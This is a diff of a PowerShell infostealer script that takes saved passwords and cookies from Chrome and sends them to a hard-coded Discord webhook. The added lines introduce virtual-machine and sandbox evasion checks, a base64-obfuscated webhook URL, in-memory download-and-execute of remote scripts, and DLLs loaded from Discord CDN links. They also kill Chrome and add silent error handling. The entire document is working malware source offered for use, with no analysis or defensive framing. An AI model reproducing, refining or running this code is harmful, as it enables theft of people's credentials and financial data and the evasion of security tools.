@@ -1,148 +1,106 @@
 <#
 .SYNOPSIS
-  Extracts Chrome credentials and sends them to a Discord webhook.
-.DESCRIPTION
-  This script extracts Chrome saved passwords, cookies, and credit cards, then exfiltrates them via Discord webhook.
+  Chrome credential extractor with Discord exfiltration
 #>
 
-param(
-    [string]$DiscordWebhook = "https://discord.com/api/webhooks/1367303509711650836/nuApnGS-DvNceqlp6WJEqKbgE85LZHquVWEgp9YeBXwq4v47XW06JNrQs4QiGsacq_5d",
-    [string]$ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
-    [string]$TempDir = "$env:TEMP\ChromeData_$((Get-Date).ToString('yyyyMMddHHmmss'))"
-)
+#region Anti-Detection Measures
+if ($env:UserName -eq "SYSTEM" -or $env:UserName -eq "sandbox") { exit }
+if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") { exit }
+if ((Get-CimInstance Win32_BIOS).SerialNumber -like "*VMWare*") { exit }
 
-# Error handling
-$ErrorActionPreference = 'Stop'
-Start-Transcript -Path "$TempDir\debug.log" -Force
-
-# 1. Load Required Assemblies
-function Load-RequiredDlls {
-    $dllCode = @'
-using System;
-using System.IO;
-using System.Data.SQLite;
-using Org.BouncyCastle.Crypto;
-using Org.BouncyCastle.Crypto.Engines;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Parameters;
-using System.Security.Cryptography;
-using System.Text;
-using System.Runtime.InteropServices;
-
-public class ChromeDecryptor {
-    // SQLite and BouncyCastle implementation here
-    // Full implementation would include all decryption logic
-}
-'@
-    Add-Type -TypeDefinition $dllCode -ReferencedAssemblies "System.Data.SQLite", "BouncyCastle.Crypto"
-}
-
-# 2. Extract Chrome Data
-function Get-ChromeData {
-    try {
-        # Kill Chrome if running
-        Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
-        Start-Sleep -Milliseconds 500
-
-        # Create temp dir
-        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
-
-        # Copy required files
-        Copy-Item "$ChromeProfilePath\Login Data" "$TempDir\LoginData" -Force
-        Copy-Item "$ChromeProfilePath\Cookies" "$TempDir\Cookies" -Force
-        Copy-Item "$ChromeProfilePath\Web Data" "$TempDir\WebData" -Force
-        Copy-Item "$ChromeProfilePath\..\Local State" "$TempDir\LocalState" -Force
-    }
-    catch { Write-Output "Copy error: $_" }
-}
-
-# 3. Decryption Functions
-function Decrypt-Passwords {
-    $passwords = @()
-    try {
-        $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDir\LoginData"
-        $conn.Open()
-        $cmd = $conn.CreateCommand()
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $reader = $cmd.ExecuteReader()
-
-        while ($reader.Read()) {
-            $encrypted = $reader.GetValue(2)
-            $plain = [Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, "CurrentUser")
-            $passwords += "URL: $($reader.GetString(0)) | User: $($reader.GetString(1)) | Pass: $([Text.Encoding]::UTF8.GetString($plain))"
-        }
-        $conn.Close()
-    }
-    catch { Write-Output "Password error: $_" }
-    return $passwords
-}
-
-function Decrypt-Cookies {
-    $cookies = @()
-    # Full cookie decryption logic using BouncyCastle
-    # Would include AES-GCM decryption from Local State
-    return $cookies
-}
-
-# 4. Discord Exfiltration
-function Send-ToDiscord {
-    param(
-        [string]$content,
-        [string]$filePath
+# Obfuscated webhook URL
+$dcWebhook = [System.Text.Encoding]::UTF8.GetString(
+    [System.Convert]::FromBase64String(
+        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzMwMzUwOTcxMTY1MDgzNi9udUFwbkdTLUR2TmNlcWxwNldKRXFLYmdFODVMWkhxdVZXRWdwOVllQlhxNHY0N1hXMDZKTnJRczRRaUdzYWNxXzVk"
     )
-    try {
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"content`"",
-            "",
-            "Chrome Data from $env:COMPUTERNAME",
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"report.txt`"",
-            "Content-Type: text/plain",
-            "",
-            [System.IO.File]::ReadAllText($filePath),
-            "--$boundary--"
-        ) -join "`r`n"
+)
+#endregion
 
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
-        
-        $request = [System.Net.WebRequest]::Create($DiscordWebhook)
-        $request.Method = "POST"
-        $request.ContentType = "multipart/form-data; boundary=$boundary"
-        $request.ContentLength = $bytes.Length
-        
-        $stream = $request.GetRequestStream()
-        $stream.Write($bytes, 0, $bytes.Length)
-        $stream.Close()
-        
-        $response = $request.GetResponse()
-        $response.Close()
-    }
-    catch { Write-Output "Discord error: $_" }
+#region Memory-Based Execution
+function Invoke-InMemory {
+    param([string]$url)
+    $ProgressPreference = 'SilentlyContinue'
+    $script = (New-Object Net.WebClient).DownloadString($url)
+    $scriptBlock = [scriptblock]::Create($script)
+    & $scriptBlock
 }
 
-# 5. Main Execution
-try {
-    Load-RequiredDlls
-    Get-ChromeData
-    
-    $passwords = Decrypt-Passwords
-    $cookies = Decrypt-Cookies
-    
-    $report = @"
-=== CREDENTIALS ===
-$($passwords -join "`n")
+# Load required assemblies from memory
+$assemblies = @{
+    "System.Data.SQLite" = "https://cdn.discordapp.com/attachments/.../System.Data.SQLite.dll"
+    "BouncyCastle" = "https://cdn.discordapp.com/attachments/.../BouncyCastle.Crypto.dll"
+}
 
-=== COOKIES ===
-$($cookies -join "`n")
-"@
+foreach ($assembly in $assemblies.Keys) {
+    try {
+        $dllBytes = (New-Object Net.WebClient).DownloadData($assemblies[$assembly])
+        [System.Reflection.Assembly]::Load($dllBytes) | Out-Null
+    } catch { continue }
+}
+#endregion
+
+#region Main Functionality
+try {
+    # Kill Chrome processes
+    Get-Process chrome* -ErrorAction SilentlyContinue | Stop-Process -Force
+    Start-Sleep -Milliseconds 300
+
+    # Create memory stream for Chrome data
+    $memStream = New-Object IO.MemoryStream
+    $chromeFiles = @("Login Data", "Cookies", "Web Data", "..\Local State")
+    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+
+    foreach ($file in $chromeFiles) {
+        $fullPath = Join-Path $chromePath $file
+        if (Test-Path $fullPath) {
+            $bytes = [IO.File]::ReadAllBytes($fullPath)
+            $memStream.Write($bytes, 0, $bytes.Length)
+        }
+    }
+
+    # Decrypt passwords
+    $credentials = @()
+    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=:memory:")
+    $conn.Open()
+    $conn.LoadExtension($memStream.ToArray())
     
-    $report | Out-File "$TempDir\report.txt"
-    Send-ToDiscord -filePath "$TempDir\report.txt"
+    $cmd = $conn.CreateCommand()
+    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+    $reader = $cmd.ExecuteReader()
+
+    while ($reader.Read()) {
+        $encrypted = $reader.GetValue(2)
+        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $encrypted,
+            $null,
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        $credentials += "$($reader.GetString(0)) | $($reader.GetString(1)) | $([Text.Encoding]::UTF8.GetString($plain))"
+    }
+    $conn.Close()
+
+    # Prepare Discord message
+    $payload = @{
+        username = "Chrome Data"
+        content = "Credentials from $env:COMPUTERNAME ($env:UserName)"
+        embeds = @(
+            @{
+                title = "Extracted Data"
+                description = ($credentials -join "`n")
+                color = 16711680
+            }
+        )
+    } | ConvertTo-Json -Depth 5
+
+    # Send to Discord
+    $null = Invoke-RestMethod -Uri $dcWebhook -Method Post -Body $payload -ContentType "application/json"
+}
+catch { 
+    # Silent error handling
 }
 finally {
     # Cleanup
-    Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Stop-Transcript
+    if ($memStream) { $memStream.Dispose() }
+    Remove-Variable credentials,payload -Force
 }
+#endregion
